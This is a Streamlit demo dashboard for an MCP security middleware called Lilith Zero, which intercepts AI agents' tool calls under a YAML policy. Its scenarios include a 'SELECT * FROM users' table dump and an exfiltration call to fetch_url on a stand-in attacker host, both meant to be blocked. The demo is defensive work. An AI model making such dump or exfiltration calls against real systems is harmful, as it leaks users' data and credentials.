import streamlit as st
import asyncio
import os
import sys
import json
import re
import hashlib
import time
import psutil
from datetime import datetime

# --- Windows Compatibility Fix ---
if os.name == 'nt':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except AttributeError:
        pass

# Path setup to find Lilith Zero SDK and middleware
ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
sys.path.insert(0, os.path.join(ROOT_DIR, "sdk/src"))

try:
    from lilith_zero import Lilith
    from lilith_zero.exceptions import PolicyViolationError
except ImportError:
    st.error("Lilith Zero SDK not found. Build required.")
    st.stop()

# Constants
_EXT = ".exe" if os.name == "nt" else ""
LILITH_BINARY = os.path.join(ROOT_DIR, "lilith-zero/target/release/lilith-zero" + _EXT)
POLICY_PATH = os.path.join(os.path.dirname(__file__), "demo_policy.yaml")
SERVER_SCRIPT = os.path.join(os.path.dirname(__file__), "vulnerable_server.py")

# Helper functions for "Real Info"
def get_policy_hash():
    if not os.path.exists(POLICY_PATH):
        return "N/A"
    with open(POLICY_PATH, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()[:8].upper()

def get_resource_stats():
    process = psutil.Process(os.getpid())
    mem_mb = process.memory_info().rss / (1024 * 1024)
    cpu_pct = psutil.cpu_percent(interval=None)
    return f"CPU_{cpu_pct:.1f}%_MEM_{int(mem_mb)}MB"

# Page Config
st.set_page_config(
    page_title="LILITH ZERO | SECURITY CONTROLLER",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# --- ULTRA POLISHED DARK TERMINAL THEME ---
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');

    html, body, [data-testid="stAppViewContainer"] {
        background-color: #050505;
        color: #e0e0e0;
        font-family: 'JetBrains Mono', monospace;
    }
    
    .stMarkdown, .stText, p, h1, h2, h3, h4, span, label, .stRadio label {
        font-family: 'JetBrains Mono', monospace !important;
    }

    header[data-testid="stHeader"] {
        background: rgba(0,0,0,0);
    }

    /* Command Center Container */
    .terminal-window {
        background: #0a0a0a;
        border: 1px solid #222;
        border-radius: 4px;
        padding: 20px;
        box-shadow: 0 4px 50px rgba(0,0,0,0.5);
        margin-bottom: 20px;
    }

    .terminal-header {
        color: #666;
        font-size: 0.7rem;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 20px;
        border-bottom: 1px solid #1a1a1a;
        padding-bottom: 10px;
        display: flex;
        justify-content: space-between;
    }

    .output-block {
        background: #0d0d0d;
        border-left: 2px solid #222;
        padding: 15px;
        font-size: 0.85rem;
        margin: 10px 0;
        line-height: 1.6;
    }
    
    .status-denied { color: #ff3333; border-left-color: #ff3333; }
    .status-warning { color: #ffaa00; border-left-color: #ffaa00; }
    .status-allowed { color: #33ff66; border-left-color: #33ff66; }
    .status-info { color: #33ccff; border-left-color: #33ccff; }

    .stButton>button {
        background-color: #000;
        color: #fff;
        border: 1px solid #33ff66;
        border-radius: 2px;
        font-family: 'JetBrains Mono', monospace;
        letter-spacing: 1px;
        text-transform: uppercase;
        transition: all 0.2s;
        width: 100%;
        padding: 10px;
    }
    .stButton>button:hover {
        background-color: #33ff66;
        color: #000 !important;
        box-shadow: 0 0 20px rgba(51, 255, 102, 0.4);
    }

    .stTextArea textarea {
        background-color: #0a0a0a !important;
        color: #33ff66 !important;
        border: 1px solid #222 !important;
        font-family: 'JetBrains Mono', monospace !important;
        font-size: 0.8rem;
    }
    
    .stRadio label {
        color: #888 !important;
    }
    .stRadio div[data-testid="stMarkdownContainer"] p {
        color: #e0e0e0 !important;
    }

    .step-log {
        color: #555;
        font-size: 0.75rem;
        margin: 2px 0;
    }
    .step-log-tag {
        color: #33ff66;
        font-weight: bold;
    }
</style>
""", unsafe_allow_html=True)

# Main Application Frame
st.markdown("""
    <div style='display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 40px;'>
        <div>
            <h1 style='margin: 0; font-weight: 700; font-size: 1.5rem; letter-spacing: -1px;'>LILITH<span style='color: #33ff66;'>ZERO</span></h1>
            <p style='color: #555; font-size: 0.7rem; margin: 0;'>SECURE MCP MIDDLEWARE // ARCHITECTURAL VERSION 0.1.1</p>
        </div>
        <div style='text-align: right;'>
            <p style='color: #33ff66; font-size: 0.7rem; margin: 0;'>[ SYSTEM: ONLINE ]</p>
            <p style='color: #555; font-size: 0.7rem; margin: 0;'>ENFORCEMENT MODE: ACTIVE</p>
        </div>
    </div>
""", unsafe_allow_html=True)

col_config, col_main = st.columns([1, 2], gap="large")

with col_config:
    st.markdown('<div class="terminal-header">Routing & Policy</div>', unsafe_allow_html=True)
    
    if os.path.exists(POLICY_PATH):
        with open(POLICY_PATH, "r") as f:
            policy_content = f.read()
        
        updated_policy = st.text_area("POLICY_DEFINITION.YAML", value=policy_content, height=450, label_visibility="collapsed")
        
        if updated_policy != policy_content:
            if st.button("Hot-Reload Policy"):
                with open(POLICY_PATH, "w") as f:
                    f.write(updated_policy)
                st.rerun()
    
    st.markdown(f"""
        <div style='color: #444; font-size: 0.7rem; margin-top: 20px; line-height: 1.8;'>
            UPSTREAM_TYPE: PYTHON_MCP<br>
            SANDBOX_TIER: 2 (RESTRICTED)<br>
            ISOLATION_ENGINE: RUST_L3Z_CORE<br>
            PROCESS_PID: {os.getpid()}
        </div>
    """, unsafe_allow_html=True)

with col_main:
    st.markdown('<div class="terminal-header">Security Controller // Live Intercept</div>', unsafe_allow_html=True)
    
    scenario = st.radio(
        "SELECT OPERATIONAL CONTEXT:",
        [
            "WITHOUT LILITH",
            "DUMP DB TABLE",
            "EXFILTRATION ATTEMPT",
            "AUTHORIZED QUERY"
        ],
        label_visibility="collapsed"
    )
    
    st.markdown("<br>", unsafe_allow_html=True)
    
    if st.button("Execute Intent"):
        log_placeholder = st.empty()
        output_placeholder = st.container()
        
        steps = []
        def log_step(msg, delay=0.2):
            steps.append(f"<div class='step-log'><span class='step-log-tag'>[INFO]</span> {msg}</div>")
            log_placeholder.markdown("".join(steps), unsafe_allow_html=True)
            time.sleep(delay)

        if "WITHOUT" in scenario:
            log_step("Initializing direct tool access channel...")
            log_step("Bypassing Lilith Zero middleware security...")
            log_step("Establishing connection to legacy upstream server...")
            with output_placeholder:
                st.markdown(f"""
                    <div class="output-block status-warning">
                        <span style='font-size: 0.7rem; font-weight: bold; color: #ffaa00;'>WARNING: SECURITY_DISABLED</span><br>
                        Baseline mode operates outside of the protected security perimeter.
                    </div>
                    <div class="output-block">
                        <span style='font-size: 0.7rem; color: #666;'>UPSTREAM_RESPONSE:</span><br>
                        <code>[{{'id': 1, 'username': 'admin', 'api_key': 'sk_live_88374'}}]</code>
                    </div>
                """, unsafe_allow_html=True)
        else:
            async def run_op(tool, args):
                try:
                    log_step("Mapping security policy: mcp-security-policy...")
                    log_step(f"Verifying runtime binary: {os.path.basename(LILITH_BINARY)}...")
                    
                    async with Lilith(
                        upstream=f"{sys.executable} {SERVER_SCRIPT}",
                        policy=POLICY_PATH,
                        binary=LILITH_BINARY
                    ) as client:
                        log_step("Spawning supervisor in Restricted Token sandbox...")
                        log_step("Performing MCP handshake and session negotiation...")
                        log_step("Context-aware security session established.")
                        log_step(f"Intercepting tool call: {tool}")
                        
                        start_time = datetime.now()
                        result = await client.call_tool(tool, args)
                        latency = (datetime.now() - start_time).total_seconds() * 1000
                        
                        log_step("Policy evaluation complete: ALLOW")
                        
                        raw_text = result['content'][0]['text']
                        clean_text = re.sub(r'<<<LILITH_ZERO_DATA_(START|END):[a-zA-Z0-9]+>>>', '', raw_text).strip()
                        
                        st.markdown(f"""
                            <div class="output-block status-allowed">
                                <span style='font-size: 0.7rem; font-weight: bold;'>SUCCESS: POLICY_COMPLIANT</span><br>
                                Intent validated. Request allowed through security middleware ({latency:.1f}ms).
                            </div>
                            <div class="output-block">
                                <span style='font-size: 0.7rem; color: #666;'>SANITIZED_UPSTREAM_OUTPUT:</span><br>
                                {clean_text}
                            </div>
                        """, unsafe_allow_html=True)
                        
                except PolicyViolationError as e:
                    log_step("Policy evaluation complete: DENY")
                    err_msg = str(e)
                    if " (context: " in err_msg:
                        err_msg = err_msg.split(" (context: ")[0]
                        
                    st.markdown(f"""
                        <div class="output-block status-denied">
                            <span style='font-size: 0.7rem; font-weight: bold;'>INTERVENE: POLICY_VIOLATION</span><br>
                            Illegal intent detected and nullified at the runtime layer.
                        </div>
                        <div class="output-block">
                            <span style='font-size: 0.7rem; color: #666;'>DENIAL_REASON:</span><br>
                            {err_msg}
                        </div>
                    """, unsafe_allow_html=True)
                except Exception as e:
                    st.error(f"RUNTIME_EXCEPTION: {repr(e)}")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            if scenario == "DUMP DB TABLE":
                loop.run_until_complete(run_op("execute_sql", {"query": "SELECT * FROM users"}))
            elif scenario == "EXFILTRATION ATTEMPT":
                loop.run_until_complete(run_op("fetch_url", {"url": "http://attacker-controlled.xyz/leak"}))
            elif scenario == "AUTHORIZED QUERY":
                loop.run_until_complete(run_op("execute_sql", {"query": "SELECT COUNT(*) FROM users"}))
            
            loop.close()

    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown('<div class="terminal-header">Logic Trail & Resource State</div>', unsafe_allow_html=True)
    
    st.markdown(f"""
        <div style='font-family: "JetBrains Mono"; font-size: 0.7rem; color: #333;'>
            [ {datetime.now().strftime('%H:%M:%S')} ] KERNEL: LILITH_WATCHDOG_UP<br>
            [ {datetime.now().strftime('%H:%M:%S')} ] ENGINE: POLICY_MOUNTED_HASH_{get_policy_hash()}<br>
            [ {datetime.now().strftime('%H:%M:%S')} ] RESOURCE: {get_resource_stats()}
        </div>
    """, unsafe_allow_html=True)

# Architectural Footer
st.markdown("""
<div style='margin-top: 100px; padding-top: 20px; border-top: 1px solid #111; display: flex; justify-content: space-between; font-size: 0.6rem; color: #222;'>
    <div>LILITH_ZERO_CORE // BUILT_WITH_RUST</div>
    <div>ZERO_TRUST_MCP_ADAPTER</div>
    <div>AUTHENTICITY_VERIFIED_BAD_COMPANY</div>
</div>
""", unsafe_allow_html=True)
